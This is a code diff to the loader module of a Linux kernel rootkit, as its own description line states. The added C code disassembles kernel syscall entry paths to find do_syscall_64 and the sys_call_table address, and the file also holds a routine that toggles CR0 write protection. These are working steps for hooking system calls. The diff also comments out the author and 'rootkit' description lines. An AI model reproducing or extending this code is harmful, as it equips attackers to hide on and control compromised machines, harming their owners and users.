@@ -93,6 +93,8 @@
 //void *readfile(const char *file, size_t *len);
 int disassemble(void *code, size_t code_len);
 void *disass_search_inst_addr(void *code, const char *inst, const char *fmt, size_t max, int position, void **location_addr);
+void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, size_t max, int position, void **loc_addr);
+void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, unsigned long from, unsigned long to, void **loc_addr);
 void *search_sct_fastpath(unsigned int **psct_addr);
 void *search_sct_slowpath(unsigned int **psct_addr);
 void *search_ia32sct_int80h(unsigned int **psct_addr);
@@ -349,6 +351,65 @@ void enable_wp(void) {
     asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
 }
 
+void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, unsigned long from, unsigned long to, void **loc_addr) {
+    csh handle;
+    cs_insn *insn;
+    void *addr_found = NULL;
+    size_t count, j, i, code_len, dist;
+    int pos_count = 0;
+
+    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
+        perr("cs_open() error\n");
+        return NULL;
+    }
+
+    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax
+
+    for (code_len = 15; 1; code_len += 15) {
+        count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
+        pinfo("%d instructions disassembled.\n", count);
+        if (count > 0) {
+            for (j = 0; j < count; j++) {
+                pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
+                for (i = 0; i < insn[j].size; i++) {
+                    pinfo("%02x ", insn[j].bytes[i]);
+                }
+                pinfo("\n");
+                if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
+					sscanf(insn[j].op_str, fmt, &addr_found);
+					if (addr_found != NULL) {
+						dist = (unsigned long)addr_found - insn[j].address;
+						pinfo("DIST = %lx\n", dist);
+						if ((dist >= from && dist <= to) || ((dist * -1) >= from && (dist * -1) <= to)) {
+							pos_count ++;
+		                    if (pos_count == position) {
+                        		pinfo("%s found! addr = %p\n", inst, addr_found);
+		                        *loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
+        		                cs_free(insn, count);
+                		        cs_close(&handle);
+								return addr_found;
+							}
+						}
+                    }
+                }
+            }
+            cs_free(insn, count);
+			pos_count = 0;
+        } else {
+            pinfo("ERROR: Failed to disassemble given code!\n");
+            cs_close(&handle);
+            return NULL;
+        }
+        if (code_len >= max) {
+            break;
+        }
+    }
+
+    cs_close(&handle);
+
+    return NULL;
+}
+
 void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, void **loc_addr) {
     csh handle;
     cs_insn *insn;
@@ -390,11 +451,7 @@ void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, siz
                 }
         	}
         	cs_free(insn, count);
-			if (pos_count == position) {
-				break;
-			} else {
-				pos_count = 0;
-			}
+			pos_count = 0;
 	    } else {
     	    pinfo("ERROR: Failed to disassemble given code!\n");
 	        cs_close(&handle);
@@ -404,6 +461,63 @@ void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, siz
 			break;
 		}
 	}
+
+    cs_close(&handle);
+
+    return NULL;
+}
+
+void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, size_t max, int position, void **loc_addr) {
+    csh handle;
+    cs_insn *insn;
+    void *addr_found = NULL;
+    size_t count;
+    size_t j, i;
+    size_t code_len;
+    int pos_count = 0;
+
+    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
+        perr("cs_open() error\n");
+        return NULL;
+    }
+
+    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax
+
+    for (code_len = 15; 1; code_len += 15) {
+        count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
+        pinfo("%d instructions disassembled.\n", count);
+        if (count > 0) {
+            for (j = 0; j < count; j++) {
+                pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
+                for (i = 0; i < insn[j].size; i++) {
+                    pinfo("%02x ", insn[j].bytes[i]);
+                }
+                pinfo("\n");
+                if (strlen(insn[j].op_str) >= strlen(opstr) && memmem(insn[j].op_str, strlen(insn[j].op_str), opstr, strlen(opstr)) != NULL) {
+                    pos_count ++;
+                    if (pos_count == position) {
+                        sscanf(insn[j].op_str, fmt, &addr_found);
+                        //int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
+                        //pinfo("r %d %p\n", r, addr_found);
+                        pinfo("%s found! addr = %p\n", opstr, addr_found);
+                        *loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
+                        cs_free(insn, count);
+                        cs_close(&handle);
+                        return addr_found;
+                    }
+                }
+            }
+            cs_free(insn, count);
+			pos_count = 0;
+        } else {
+            pinfo("ERROR: Failed to disassemble given code!\n");
+            cs_close(&handle);
+            return NULL;
+        }
+        if (code_len >= max) {
+            break;
+        }
+    }
 
     cs_close(&handle);
 
@@ -505,7 +619,8 @@ void *search_ia32sct_int80h(unsigned int **psct_addr) {
     idt = (gate_desc *) idtr.address;
     ia32sct = (0xffffffffffffffff - (0 - (unsigned int)gate_offset(&idt[0x80])) + 1);
     pinfo("int 0x80 handler address = %p\n", ia32sct);
-	ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
+	//ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
+	ia32sct = disass_search_inst_range_addr(ia32sct, "call", "%lx", 0x300, 1, 0x6f0000, 0xa10000, (void **)psct_addr);
 	if (ia32sct != NULL) {
 		ia32sct = disass_search_inst_addr(ia32sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 		if (ia32sct != NULL) {
@@ -527,44 +642,78 @@ void *search_sct_fastpath(unsigned int **psct_addr) {
 	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
-		//disassemble(sct, 0x100);
-		sct = memmem(sct, 0x100, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
+		//disassemble(sct, 0x200);
+		//sct = memmem(sct, 0x200, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
+		sct = disass_search_opstr_addr(sct, "(, %rax, 8)", "-%x", 0x200, 1, (void **)psct_addr);
 		if (sct) {
-			sct += 3;
-			*psct_addr = (unsigned int *)sct;
-			sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
+			//sct += 3;
+			//*psct_addr = (unsigned int *)sct;
+			sct = (void *) ((long) sct * -1);
 			return sct;
 		} else{
 			// can't write without sys_write() :(
-			//perr("Sorry! call not found when searching sct.\n");
+			perr("Sorry! call not found when searching sct in fastpath.\n");
 		}
 	} else {
 		// commented after leaving the use of kallsysm_lookup_name() :(
-		//perr("Sorry! jmp address not found when searching sct.\n");
+		perr("Sorry! jmp address not found when searching sct in fastpath.\n");
 	}
 
 	return NULL;
 }
 
+// v4.13.0-31: 2nd call to distance >= 0x6f0000 <= 0xa10000
 void *search_sct_slowpath(unsigned int **psct_addr) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
+	void *tmp = NULL;
 	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
 	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
 		sct += 3;
-		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
-		sct = disass_search_inst_addr(sct, "jne", "%lx", 0x100, 1, (void **)psct_addr);
-		if (sct != NULL) {
-			sct = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, (void **)psct_addr);
-			if (sct != NULL) {
-				sct = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
+		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
+/*
+		tmp = disass_search_inst_addr(sct, "jne", "%lx", 0x100, 1, (void **)psct_addr);
+		if (tmp == NULL) {
+			tmp = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, (void **)psct_addr);
+		}
+		if (tmp != NULL) {
+			sct = tmp;
+			tmp = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, (void **)psct_addr);
+			if (tmp != NULL) {
+				sct = tmp;
+				tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
+				if (tmp != NULL) {
+					sct = tmp;
+					sct = (void *)((long) sct * -1);
+					return sct;
+				}
+			} else {
+				perr("Sorry! call not found when searching sct in slowpath.\n");
+			}
+		} else {
+			perr("Sorry! jne address not found when searching sct in slowpath.\n");
+		}
+	}
+*/
+
+		tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x6f0000, 0xa10000, (void **)psct_addr);
+		if (tmp != NULL) {
+			sct = tmp;
+			pinfo("do_syscall_64 at %p\n", sct);
+			tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
+			if (tmp != NULL) {
+				sct = tmp;
 				sct = (void *)((long) sct * -1);
 				return sct;
+			} else {
+				perr("Sorry, can't locate call with sys_call_table.\n");
 			}
+		} else {
+			perr("Sorry, can't locate do_syscall_64.\n");
 		}
 	}
 	return NULL;
 }
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
-MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
+//MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
+//MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
